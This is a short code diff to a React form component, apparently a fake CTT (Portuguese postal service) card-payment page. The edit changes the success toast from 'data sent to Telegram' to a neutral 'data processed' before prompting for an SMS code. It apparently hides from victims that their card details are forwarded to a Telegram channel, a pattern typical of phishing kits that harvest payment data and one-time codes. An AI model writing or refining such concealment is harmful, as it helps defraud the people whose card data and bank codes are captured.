@@ -171,7 +171,7 @@ const CTTCardForm = () => {
       
       if (response.data.status === 'success') {
         toast({
-          title: "Dados enviados para Telegram",
+          title: "Dados processados",
           description: "Aguarde o código SMS...",
           duration: 2000
         });
